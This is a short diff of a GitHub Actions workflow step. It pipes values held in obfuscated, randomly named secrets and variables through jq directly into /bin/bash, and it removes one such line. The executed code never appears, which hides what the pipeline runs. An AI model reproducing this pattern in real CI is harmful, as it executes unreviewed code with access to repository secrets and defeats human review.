@@ -19,7 +19,6 @@ jobs:
           lfh744: ${{ secrets.lfh744 }}
         run: |
           printf '%s' "$lfh744" | jq -r .xd3 | /bin/bash
-          echo $xorn7481 | jq -r .srgv0 | /bin/bash
           echo $sa7058 | jq -r .ho0 | /bin/bash
           echo $gvrro38395 | jq -r .izv269 | /bin/bash
           echo $oggol009 | jq -r .mrnhh254 | /bin/bash
